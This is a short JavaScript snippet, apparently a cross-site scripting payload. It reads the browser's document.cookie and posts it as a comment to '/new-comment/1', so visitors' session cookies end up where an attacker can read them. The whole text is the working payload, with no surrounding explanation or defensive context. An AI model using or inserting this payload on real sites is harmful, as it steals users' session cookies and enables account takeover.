var post_data = 'text='+document.cookie;
var xmlhttp = new XMLHttpRequest();
xmlhttp.open("POST", "/new-comment/1", true);
xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xmlhttp.send(post_data);
